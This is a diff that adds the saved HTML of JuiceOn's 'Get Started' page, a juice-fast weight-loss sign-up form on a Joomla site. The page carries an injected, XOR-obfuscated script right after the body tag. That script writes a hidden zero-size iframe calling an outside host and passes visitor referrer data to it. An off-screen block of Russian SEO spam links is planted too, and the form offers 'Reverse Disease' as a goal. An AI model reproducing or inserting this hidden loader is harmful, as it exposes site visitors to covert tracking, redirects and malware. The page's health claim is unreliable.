@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" dir="ltr">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <base href="http://www.juiceon.co.za/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="keywords" content="Get Started, JuiceOn, online program, weight loss" />
+  <meta name="rights" content="http://www.juiceon.co.za/" />
+  <meta name="title" content="JuiceOn - Get Started - JuiceOn" />
+  <meta name="description" content="Get started with JuiceOn, your online guided juice fast. Order your JuiceOn program from our online today and get started! " />
+  
+  <title>JuiceOn - Get Started - JuiceOn</title>
+  <link href="/templates/vt_weightloss/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" href="/media/system/css/modal.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_k2/css/k2.css" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jsnframework/assets/3rd-party/jquery-ui/css/ui-bootstrap/jquery.ui.1.9.0.ie.css" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jsnframework/assets/joomlashine/css/jsn-gui.css" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jsnframework/assets/3rd-party/jquery-tipsy/tipsy.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_uniform/assets/css/form.css" type="text/css" />
+  <link rel="stylesheet" href="/form?form_id=1&amp;task=generateStylePages" type="text/css" />
+  <link rel="stylesheet" href="/templates/vt_weightloss/vtemtools/menus/css/style.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.juiceon.co.za/modules/mod_fje_likebox/css/style.css" type="text/css" />
+  <style type="text/css">
+.floatleft{float:left;}.floatright{float:right;}.none{display:none !important; visibility:hidden !important;}.navleft,.navleft1{width:20% !important;}.navright,.navright1{width:20% !important;}.contentwidthr{width:80% !important;}.contentwidthl{width:80% !important;}.contentwidth{width:60% !important;}.vt_section{width:1000px !important}body#vtem{font-family:Arial, Helvetica, sans-serif !important; font-size:12px !important;}h3,#vtem_menu{font-family:'Dosis', sans-serif;}.headermanual1{width:25% !important;}.headermanual2{width:75% !important;}.headermanual3{width:0% !important;}.headermanual4{width:0% !important;}.headermanual5{width:0% !important;}.headermanual6{width:0% !important;}.vt_width50{width:50% !important;}.vt_width25{width:25% !important;}.vt_width100{width:100% !important;}
+  </style>
+  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-noconflict.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-migrate.min.js" type="text/javascript"></script>
+  <script src="/media/system/js/core.js" type="text/javascript"></script>
+  <script src="/media/system/js/mootools-more.js" type="text/javascript"></script>
+  <script src="/media/system/js/modal.js" type="text/javascript"></script>
+  <script src="/media/k2/assets/js/k2.noconflict.js" type="text/javascript"></script>
+  <script src="/components/com_k2/js/k2.js" type="text/javascript"></script>
+  <script src="/administrator/components/com_remoteimage/includes/js/remoteimage-admin.js" type="text/javascript"></script>
+  <script src="/components/com_uniform/assets/js/jsn_uf_jquery_safe.js" type="text/javascript"></script>
+  <script src="/components/com_uniform/assets/js/libs/jquery.placeholder.js" type="text/javascript"></script>
+  <script src="/components/com_uniform/assets/js/libs/json-2.3.min.js" type="text/javascript"></script>
+  <script src="/plugins/system/jsnframework/assets/3rd-party/jquery-tipsy/jquery.tipsy.js" type="text/javascript"></script>
+  <script src="/plugins/system/jsnframework/assets/3rd-party/jquery-scrollto/jquery.scrollTo.js" type="text/javascript"></script>
+  <script src="/media/jui/js/bootstrap.min.js" type="text/javascript"></script>
+  <script src="/components/com_uniform/assets/js/form.js" type="text/javascript"></script>
+  <script src="/components/com_uniform/assets/js/jsn_uf_conflict.js" type="text/javascript"></script>
+  <script src="/media/system/js/caption.js" type="text/javascript"></script>
+  <script src="/templates/vt_weightloss/vtemtools/menus/vtem_menu.js" type="text/javascript"></script>
+  <script type="text/javascript">
+
+		jQuery(function($) {
+			SqueezeBox.initialize({});
+			SqueezeBox.assign($('a.modal').get(), {
+				parse: 'rel'
+			});
+		});var K2SitePath = '/';jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});
+  </script>
+
+<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="/templates/vt_weightloss/css/template.css" type="text/css" />
+<link rel="stylesheet" href="/templates/vt_weightloss/css/styles/style1.css" type="text/css" />
+<link rel="stylesheet" href="/templates/vt_weightloss/css/responsive.css" type="text/css" /><script type="text/javascript">
+      WebFontConfig = {
+        google: { families: ["Dosis"] }
+      };
+      (function() {
+        var wf = document.createElement("script");
+        wf.src = ("https:" == document.location.protocol ? "https" : "http") +
+            "://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js";
+        wf.type = "text/javascript";
+        wf.async = "true";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(wf, s);
+      })();
+    </script><!--[if lt IE 9]>
+		<script src="/media/jui/js/html5.js"></script>
+<![endif]-->
+<!--Start of yoonique.net Zopim Live Chat Script-->
+<script type="text/javascript">window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set._.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute('charset','utf-8'); $.src='//v2.zopim.com/?1lpdi4RC6fBagtMnKsWzC1nX1ws43uBY';z.t=+new Date;$.type='text/javascript';e.parentNode.insertBefore($,e)})(document,'script');</script>
+<!--End of yoonique.net Zopim Live Chat Script--></head><!--<a class="twitter-timeline" href="https://twitter.com/JuicingOn" data-widget-id="411114448074465280">Tweets by @JuicingOn</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>-->
+
+<!-- Piwik -->
+<script type="text/javascript">
+  var _paq = _paq || [];
+  _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u=(("https:" == document.location.protocol) ? "https" : "http") + "://brandmedia.co.za/piwik/";
+    _paq.push(['setTrackerUrl', u+'piwik.php']);
+    _paq.push(['setSiteId', 3]);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0]; g.type='text/javascript';
+    g.defer=true; g.async=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<noscript><p><img src="http://brandmedia.co.za/piwik/piwik.php?idsite=3" style="border:0;" alt="" /></p></noscript>
+<!-- End Piwik Code -->
+
+
+
+<body id="vtem" class="ie ie9 win com_content article template-style1">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+
+
+ 
+  <div id="vt_body_wrapper">
+      <div id="vt_main_wrapper">
+    <div id="vt_wrapper" class="clearfix">
+      <!-- /////////////////// HEADER LAYOUT ///////////////////////////////-->
+      <div id="vt_header_section" class="vt_header_section clearfix">  
+                  
+                    <div class="vt_wrapper_header clearfix">
+                      <div class="vt_section clearfix">        
+                         <div id="vt_header" class="vt_header clearfix">
+                              <div class="headermanual1  floatleft"><div class="vt_module_inside"><a id="vt_logo" href="http://www.juiceon.co.za/"><img src="templates/vt_weightloss/css/styles/vt_logo_style1.png" alt="VTEM Logo" /></a>		<div class="vt_moduletable clearfix moduletable">
+        <div class="vt_box">
+					
+
+
+
+
+<script type="text/javascript">jQuery.noConflict();</script>
+
+
+<div class="scroll"></div>
+        <div id="jslikeboxsidebarright" style="top: 90px;">
+			
+            <div class="jslikeboxsidebarinner"><div class="jslikeboxsidebarbuttonright">
+			
+			
+			<div id="likeboxbluearrowright" style="width: 326px; padding: 7px;">
+
+			
+			 <div id="likebox-frame-lightr" style="width: 288px; overflow: hidden;">
+		<!--[if IE]>
+			 <iframe style="width: 293px; height: 610px; margin: -1px -4px 0 -4px;" frameborder="0" border="0" src="http://www.facebook.com/plugins/likebox.php?locale=en_GB&href=https://www.facebook.com/JuiceOnOnline&width=300&colorscheme=light&connections=50&stream=true&header=false&height=820" scrolling="no" frameborder="0" allowTransparency="true"></iframe>
+<![endif]-->
+
+<!--[if !IE]>-->
+    <object type="text/html" style="width: 293px; height: 610px; margin: -1px -4px 0 -4px;" data="http://www.facebook.com/plugins/likebox.php?locale=en_GB&href=https://www.facebook.com/JuiceOnOnline&width=300&colorscheme=light&connections=50&stream=true&header=false&height=820" ></object>
+<!--<![endif]-->
+
+		</div>	
+		
+	</div></div></div>
+
+
+</div>
+
+        <script type="text/javascript">
+
+             jQuery(document).ready(function($) {
+
+
+                $('#jslikeboxsidebarleft > div').hover(
+                    function () {
+                        $('.jslikeboxsidebarbuttonleft',$(this)).stop().animate({'marginLeft':'-12px'},400);
+                    },
+                    function () {
+                        $('.jslikeboxsidebarbuttonleft',$(this)).stop().animate({'marginLeft':'-305px'},400);
+                    }
+                );
+       
+		
+                $('#jslikeboxsidebarright > div').hover(
+                    function () {
+                        $('.jslikeboxsidebarbuttonright',$(this)).stop().animate({'marginLeft':'-290px'},400);
+                    },
+                    function () {
+                        $('.jslikeboxsidebarbuttonright',$(this)).stop().animate({'marginLeft':'8px'},400);
+                    }
+                );
+            });
+			
+</script>  
+
+
+
+
+
+                </div>   
+		</div>
+	</div></div><div class="headermanual2 separator_header floatleft"><div class="vt_module_inside defaultmenu"><div id="vt_main_menu" class="vt_menufix clearfix"><div id="vtem_menu" class="mlmenu plus fade"><ul class="menu_vtem_nav">
+<li id="item-482"><a href="/" > <span> Home</span></a></li><li id="item-483"><a href="/about" > <span> About</span></a></li><li id="item-508"><a href="/content/weight-loss" > <span> Weight Loss</span></a></li><li id="item-524" class="current active"><a href="/get-started" > <span> Get Started</span></a></li><li id="item-529"><a href="/juicy-stuff" > <span> Juicy Stuff </span></a></li><li id="item-549"><a href="/success-stories" > <span> Success Stories</span></a></li><li id="item-666"><a href="/content/juicers" > <span> Juicers</span></a></li><li id="item-668"><a href="/content/contact" > <span> Contact</span></a></li></ul></div><a href="#vtem_menu_mobile" class="vtemdrildown vtemdrillround" id="vtflatmenu">Mobile menu</a><div id="vtem_menu_mobile" class="hidden vt_drilldown_menu" style="display:none;"><ul class="menu-mobi">
+<li id="item-482"><a href="/" > <span> Home</span></a></li><li id="item-483"><a href="/about" > <span> About</span></a></li><li id="item-508"><a href="/content/weight-loss" > <span> Weight Loss</span></a></li><li id="item-524" class="current active"><a href="/get-started" > <span> Get Started</span></a></li><li id="item-529"><a href="/juicy-stuff" > <span> Juicy Stuff </span></a></li><li id="item-549"><a href="/success-stories" > <span> Success Stories</span></a></li><li id="item-666"><a href="/content/juicers" > <span> Juicers</span></a></li><li id="item-668"><a href="/content/contact" > <span> Contact</span></a></li></ul></div></div></div></div>                         </div>
+                         </div>
+                     </div>  
+                                                  
+      </div> 
+       <!-- /////////////////// MAIN LAYOUT ///////////////////////////////-->
+       <div id="vt_main_section" class="vt_main_section clearfix">
+                 
+                              
+                  <div id="vt_main_contaner" class="clearfix">
+                       <div id="vt_main_inside" class="clearfix">
+                        <div class="vt_section clearfix">
+              <div id="vt_main_com" class="vt_auto_cols widthmain100 floatleft">
+                           <div class="vt_component_inside"><div class="vt_blog">
+<div class="vt_detail_page item-page">
+		
+
+	
+	
+		                                                                                                                                                                                                                                                 <div id="vtem-nt"><a href="http://joomla-master.org/" target="_blank" title="Joomla шаблоны">Joomla шаблоны</a><br><a href="http://мир-историй.рф/" target="_blank" title="аудио книги скачать">аудио книги скачать</a></div>
+						<table border="0" width="90%" cellspacing="0" cellpadding="0" align="center">
+<tbody>
+<tr>
+<td rowspan="4" width="20%"> </td>
+</tr>
+<tr>
+<td><img src="http://juiceon.co.za/images/content/JuiceOn-Getting-Started.jpg" alt="JuiceOn-Getting-Started.jpg" /></td>
+</tr>
+<tr>
+<td>
+<h3 style="margin: 0px 0px 1.2em; padding: 0px; line-height: 21px; border: 0px; outline: 0px; font-size: 14px; vertical-align: baseline; font-family: Arial, sans-serif; color: #2d6b33; text-align: justify;"><span style="font-size: 14pt; color: #549c2f;">Step 1: Complete the <strong>Getting Started</strong> form below!</span></h3>
+<h3 style="margin: 0px 0px 1.2em; padding: 0px; line-height: 21px; border: 0px; outline: 0px; font-size: 14px; vertical-align: baseline; font-family: Arial, sans-serif; color: #2d6b33; text-align: justify;"><span style="font-size: 14pt; color: #549c2f;">Step 2: Order a JuiceOn program and Juicer from our <strong>online Shop</strong></span></h3>
+<h3 style="margin: 0px 0px 1.2em; padding: 0px; line-height: 21px; border: 0px; outline: 0px; font-size: 14px; vertical-align: baseline; font-family: Arial, sans-serif; color: #2d6b33; text-align: justify;"><span style="font-size: 14pt; color: #549c2f;">Step 3: Get the correct juicer! check out our <a class="vtem-typo-btn btn-rounded vtem-typo-btn-small btn-green" title="" href="http://www.juiceon.co.za/juicers/juicers">Juicers</a> page</span></h3>
+</td>
+</tr>
+<tr>
+<td><div class="jsn-uniform jsn-master" data-form-name='095ce5377c9c950763deed0aba9b3f03' id='jsn_form_1'><div class="jsn-bootstrap"><form name='form_095ce5377c9c950763deed0aba9b3f03' id='form_095ce5377c9c950763deed0aba9b3f03' action="http://juiceon.co.za/?option=com_uniform&amp;view=form&amp;task=form.save&amp;form_id=1" method="post" class="form-validate Vertical " enctype="multipart/form-data" ><span class="hide jsn-language" style="display:none;" data-value='{"JSN_UNIFORM_CHARACTERS":"Characters","JSN_UNIFORM_WORDS":"Words","JSN_UNIFORM_CONFIRM_FIELD_PASSWORD_MIN_MAX_CHARACTER":"The password must contain minimum %mi% and maximum %mx% character(s)","JSN_UNIFORM_CONFIRM_FIELD_EMAIL_CONFIRM":"Both email addresses must be the same.","JSN_UNIFORM_CONFIRM_FIELD_MIN_NUMBER":"The number cannot be less than","JSN_UNIFORM_CONFIRM_FIELD_MAX_NUMBER":"The number cannot be greater than","JSN_UNIFORM_DATE_HOUR_TEXT":"Hour","JSN_UNIFORM_DATE_MINUTE_TEXT":"Minute","JSN_UNIFORM_DATE_CLOSE_TEXT":"Close","JSN_UNIFORM_DATE_PREV_TEXT":"Prev","JSN_UNIFORM_DATE_NEXT_TEXT":"Next","JSN_UNIFORM_DATE_CURRENT_TEXT":"Today","JSN_UNIFORM_DATE_MONTH_JANUARY":"January","JSN_UNIFORM_DATE_MONTH_FEBRUARY":"February","JSN_UNIFORM_DATE_MONTH_MARCH":"March","JSN_UNIFORM_DATE_MONTH_APRIL":"April","JSN_UNIFORM_DATE_MONTH_MAY":"May","JSN_UNIFORM_DATE_MONTH_JUNE":"June","JSN_UNIFORM_DATE_MONTH_JULY":"July","JSN_UNIFORM_DATE_MONTH_AUGUST":"August","JSN_UNIFORM_DATE_MONTH_SEPTEMBER":"September","JSN_UNIFORM_DATE_MONTH_OCTOBER":"October","JSN_UNIFORM_DATE_MONTH_NOVEMBER":"November","JSN_UNIFORM_DATE_MONTH_DECEMBER":"December","JSN_UNIFORM_DATE_MONTH_JANUARY_SHORT":"Jan","JSN_UNIFORM_DATE_MONTH_FEBRUARY_SHORT":"Feb","JSN_UNIFORM_DATE_MONTH_MARCH_SHORT":"Mar","JSN_UNIFORM_DATE_MONTH_APRIL_SHORT":"Apr","JSN_UNIFORM_DATE_MONTH_MAY_SHORT":"May","JSN_UNIFORM_DATE_MONTH_JUNE_SHORT":"Jun","JSN_UNIFORM_DATE_MONTH_JULY_SHORT":"Jul","JSN_UNIFORM_DATE_MONTH_AUGUST_SHORT":"Aug","JSN_UNIFORM_DATE_MONTH_SEPTEMBER_SHORT":"Sep","JSN_UNIFORM_DATE_MONTH_OCTOBER_SHORT":"Oct","JSN_UNIFORM_DATE_MONTH_NOVEMBER_SHORT":"Nov","JSN_UNIFORM_DATE_MONTH_DECEMBER_SHORT":"Dec","JSN_UNIFORM_DATE_DAY_SUNDAY":"Sunday","JSN_UNIFORM_DATE_DAY_MONDAY":"Monday","JSN_UNIFORM_DATE_DAY_TUESDAY":"Tuesday","JSN_UNIFORM_DATE_DAY_WEDNESDAY":"Wednesday","JSN_UNIFORM_DATE_DAY_THURSDAY":"Thursday","JSN_UNIFORM_DATE_DAY_FRIDAY":"Friday","JSN_UNIFORM_DATE_DAY_SATURDAY":"Saturday","JSN_UNIFORM_DATE_DAY_SUNDAY_SHORT":"Sun","JSN_UNIFORM_DATE_DAY_MONDAY_SHORT":"Mon","JSN_UNIFORM_DATE_DAY_TUESDAY_SHORT":"Tue","JSN_UNIFORM_DATE_DAY_WEDNESDAY_SHORT":"Wed","JSN_UNIFORM_DATE_DAY_THURSDAY_SHORT":"Thu","JSN_UNIFORM_DATE_DAY_FRIDAY_SHORT":"Fri","JSN_UNIFORM_DATE_DAY_SATURDAY_SHORT":"Sat","JSN_UNIFORM_DATE_DAY_SUNDAY_MIN":"Su","JSN_UNIFORM_DATE_DAY_MONDAY_MIN":"Mo","JSN_UNIFORM_DATE_DAY_TUESDAY_MIN":"Tu","JSN_UNIFORM_DATE_DAY_WEDNESDAY_MIN":"We","JSN_UNIFORM_DATE_DAY_THURSDAY_MIN":"Th","JSN_UNIFORM_DATE_DAY_FRIDAY_MIN":"Fr","JSN_UNIFORM_DATE_DAY_SATURDAY_MIN":"Sa","JSN_UNIFORM_DATE_DAY_WEEK_HEADER":"Wk","JSN_UNIFORM_CONFIRM_FIELD_MAX_LENGTH":"The information cannot contain more than","JSN_UNIFORM_CONFIRM_FIELD_MIN_LENGTH":"The information cannot contain less than","JSN_UNIFORM_CAPTCHA_PUBLICKEY":"JSN_UNIFORM_CAPTCHA_PUBLICKEY","JSN_UNIFORM_BUTTON_BACK":"Back","JSN_UNIFORM_BUTTON_NEXT":"Next","JSN_UNIFORM_BUTTON_RESET":"Reset","JSN_UNIFORM_BUTTON_SUBMIT":"Submit","JSN_UNIFORM_CONFIRM_FIELD_CANNOT_EMPTY":"This field can not be empty, please enter required information.","JSN_UNIFORM_CONFIRM_FIELD_INVALID":"The information is invalid, please correct."}'></span><span class="hide jsn-base-url" style="display:none;" data-value="http://juiceon.co.za"></span><div id="page-loading" class="jsn-bgloading"><i class="jsn-icon32 jsn-icon-loading"></i></div><div class="jsn-row-container jsn-style-JuiceOn"><div class="message-uniform"> </div><div data-value="1" class="jsn-form-content hide"><div class='jsn-row-container row-fluid'><div class="jsn-container-left span12"><div class="control-group input-size name "><label for="Name" class="control-label">Name<span class="required">*</span></label><div id="1" class="controls group-blank-required"><select class="jsn-input-fluid" name="name[1][title]"><option selected='true' value="Mrs">Mrs</option><option  value="Mr">Mr</option><option  value="Ms">Ms</option></select>&nbsp;&nbsp;<input type="text" class="jsn-input-fluid" value='' name="name[1][first]" placeholder="First" />&nbsp;&nbsp;<input type="text" class="jsn-input-fluid" value='' name="name[1][last]" placeholder="Last" /></div></div>
+<div class="control-group input-size contact_phone "><label for="Contact Phone" class="control-label">Contact Phone<span class="required">*</span> <i original-title="Please enter a contact number" class="icon-question-sign"></i></label><div class="controls group-blank-required"><input class="phone jsn-input-medium-fluid" id="3" name="phone[3][default]" type="text" value="" placeholder="" /></div></div>
+<div class="control-group input-size email "><label for="Email" class="control-label">Email<span class="required">*</span></label><div class="controls"><div class="row-fluid"><input class="email email-required jsn-input-medium-fluid" id="2" name="2" type="text" value="" placeholder="" /></div></div></div>
+<div class="control-group  how_would_you_like_us_to_contact_you_  " data-settings="" ><label for="How would you like us to contact you?" class="control-label">How would you like us to contact you?<span class="required">*</span></label><div class="controls choices-required"><div id="5" class="choices jsn-columns-container jsn-columns-count-no "><div class="jsn-column-item"><label class="radio"><input  name="5" value=" Email" type="radio" /> Email</label></div><div class="jsn-column-item"><label class="radio"><input  name="5" value=" Phone" type="radio" /> Phone</label></div><div class="clearbreak"></div></div></div></div></div></div><div class='jsn-row-container row-fluid'><div class="jsn-container-left_2 span12"><div class="control-group  what_is_your_main_reason_for_wanting_to_do_a_juice_fast_  " data-settings=""><label for="What is your main reason for wanting to do a Juice Fast?" class="control-label">What is your main reason for wanting to do a Juice Fast?<span class="required">*</span></label><div class="controls"><div id="4" class="checkboxes jsn-columns-container jsn-columns-count-no  checkbox-required"><div class="jsn-column-item"><label class="checkbox"><input  name="4[]" value="Lose Weight" type="checkbox" />Lose Weight</label></div><div class="jsn-column-item"><label class="checkbox"><input  name="4[]" value="Reverse Disease" type="checkbox" />Reverse Disease</label></div><div class="jsn-column-item"><label class="checkbox"><input  name="4[]" value="Lifestyle Change" type="checkbox" />Lifestyle Change</label></div><div class="jsn-column-item"><label class="checkbox"><input  name="4[]" value="Detox" type="checkbox" />Detox</label></div><div class="clearbreak"></div></div></div></div>
+<div class="control-group input-size please_send_us_a_full_body_length_photo "><label for="Please send us a full body length photo" class="control-label">Please send us a full body length photo <i original-title="not more then 1 MG (png,jpg,gif)" class="icon-question-sign"></i></label><div class="controls "><input id="6" class="input-file" name="6[]"  type="file" /></div></div></div></div><div class="control-group">
+									<div class="controls">
+									<div class="row-fluid"><img src="data:image/png;base64,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